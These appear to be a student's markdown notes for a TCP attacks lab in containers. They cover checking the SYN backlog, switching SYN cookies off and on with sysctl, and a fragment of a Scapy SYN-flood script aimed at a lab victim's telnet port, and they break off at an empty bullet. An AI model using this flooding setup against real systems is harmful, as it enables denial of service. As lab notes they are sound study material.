# TCP Attacks
## Containers setup
- run in each the following line replacing `role` with what the container is, just to recognize them easier from the prompt
  - ```echo 'PS1="role | $PS1"' >> ~/.bashrc```

# Task 1: SYN Flooding Attack
## 1.1 $-$ With python
### Notes
| desc | command |
| --- | --- |
| see queu size for connections | `sysctl net.ipv4.tcp_max_syn_backlog` |
| check usage of queue (look for SYN-RECV, number of half-opened connections) | `netstat -nat` |

### On SYN cookie countermeasue
enabled by default, we can change it:
```bash
$ sysctl -a | grep syncookies # Display the SYN cookie flag 
$ sysctl -w net.ipv4.tcp_syncookies=0 # turn off SYN cookie
$ sysctl -w net.ipv4.tcp_syncookies=1 # turn on SYN cookie
```

### Solving
- set IP destination and port (the victim machine and the tcp port on which it's listening)
  ```python
  ip = IP(dst="10.9.0.5")
  tcp = TCP(dport=23, flags='S')
  ```
- launch the python script from the attacker and monitor the recv queue on the victim
  ```bash
  # Attacker
  python3 synflood.py
  # === 
  # Victim
  watch -n 0.5 netstat -nat
  ```
- 